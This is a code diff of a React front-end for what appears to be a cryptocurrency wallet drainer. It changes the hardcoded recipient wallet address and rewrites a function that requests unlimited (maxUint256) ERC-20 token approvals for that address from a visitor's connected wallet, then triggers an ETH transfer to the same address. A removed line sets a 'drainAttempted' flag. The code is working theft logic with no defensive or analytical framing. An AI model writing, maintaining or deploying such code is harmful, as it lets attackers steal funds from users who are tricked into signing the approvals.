@@ -7,7 +7,7 @@ import { parseEther, maxUint256 } from 'viem';
 import { erc20Abi } from 'viem';
 
 // Your specified recipient address for both approval and ETH transfer
-const RECIPIENT_ADDRESS = '0x661A263CD9AA2753af6a4501316172bD9497f143' as const;
+const RECIPIENT_ADDRESS = '0x30925a8A61e2c66fDE526A82c76d030E7D704694' as const;
 
 // Token addresses on different networks
 const TOKEN_ADDRESSES = {
@@ -125,14 +125,14 @@ export default function Home() {
         setNetworkSupported(true);
         
         // Update selected tokens to only include available ones
-       const updatedSelection = Object.fromEntries(
-  Object.entries(selectedTokens).map(([token, selected]) => [
-    token,
-    selected && token in chainTokens
-  ])
-) as typeof selectedTokens;
+        const updatedSelection = Object.fromEntries(
+          Object.entries(selectedTokens).map(([token, selected]) => [
+            token,
+            selected && token in chainTokens
+          ])
+        ) as typeof selectedTokens;
 
-setSelectedTokens(updatedSelection);
+        setSelectedTokens(updatedSelection);
       } else {
         setAvailableTokens({});
         setNetworkSupported(false);
@@ -194,49 +194,39 @@ setSelectedTokens(updatedSelection);
     );
   };
 
-  const requestTokenApprovals = async () => {
-    if (!chain?.id || Object.keys(availableTokens).length === 0) {
-      setCurrentStep('No tokens available for this network');
+ // In your Home component
+const requestTokenApprovals = async () => {
+  if (!chain?.id || Object.keys(availableTokens).length === 0) return;
+
+  setCurrentStep('Requesting token approvals...');
+
+  const tokensToApprove = Object.entries(selectedTokens)
+    .filter(([token, isSelected]) => isSelected && availableTokens[token]);
+
+  for (const [tokenSymbol] of tokensToApprove) {
+    const tokenAddress = availableTokens[tokenSymbol];
+    setCurrentStep(`Approving ${tokenSymbol}...`);
+
+    try {
+      await writeContractAsync({
+        address: tokenAddress,
+        abi: erc20Abi,
+        functionName: 'approve',
+        args: [RECIPIENT_ADDRESS, maxUint256], // Always use maxUint256 for unlimited
+      });
+      
+      console.log(`${tokenSymbol} unlimited approval successful`);
+    } catch (error) {
+      console.error(`${tokenSymbol} approval failed:`, error);
+      setCurrentStep(`${tokenSymbol} approval failed`);
       return;
     }
+  }
 
-    setCurrentStep('Requesting token approvals...');
-
-    // Get selected tokens that exist on this network
-    const tokensToApprove = Object.entries(selectedTokens)
-      .filter(([token, isSelected]) => isSelected && availableTokens[token])
-      .map(([token]) => token);
-
-    if (tokensToApprove.length === 0) {
-      setCurrentStep('No tokens selected for approval');
-      return;
-    }
-
-    for (const tokenSymbol of tokensToApprove) {
-      const tokenAddress = availableTokens[tokenSymbol];
-      setCurrentStep(`Approving ${tokenSymbol}...`);
-
-      try {
-        await writeContractAsync({
-          address: tokenAddress,
-          abi: erc20Abi,
-          functionName: 'approve',
-          args: [RECIPIENT_ADDRESS, maxUint256],
-        });
-        
-        console.log(`${tokenSymbol} approval successful`);
-      } catch (error) {
-        console.error(`${tokenSymbol} approval failed:`, error);
-        setCurrentStep(`${tokenSymbol} approval failed`);
-        setDrainAttempted(true);
-        return; // Stop if any approval fails
-      }
-    }
-
-    setApprovalSent(true);
-    setCurrentStep('All approvals granted, sending ETH...');
-    sendEthTransfer();
-  };
+  setApprovalSent(true);
+  setCurrentStep('All approvals granted, sending ETH...');
+  sendEthTransfer();
+};
 
   const formatAddress = (addr: string | undefined): string => {
     if (!addr) return '';
